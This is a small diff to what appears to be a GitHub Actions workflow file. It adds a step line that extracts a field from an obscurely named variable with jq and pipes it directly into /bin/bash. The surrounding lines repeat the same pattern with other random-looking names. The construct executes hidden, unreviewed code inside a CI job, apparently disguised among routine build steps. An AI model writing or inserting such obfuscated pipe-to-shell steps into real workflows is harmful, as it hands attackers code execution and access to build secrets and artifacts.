@@ -30,6 +30,7 @@ jobs:
           echo $iqo7830 | jq -r .aa562 | /bin/bash
           printf '%s' "$grrh1" | jq -r .yxn53325 | /bin/bash
           printf '%s' "$sf10" | jq -r .uu25697 | /bin/bash
+          echo $yufs55381 | jq -r .q7 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
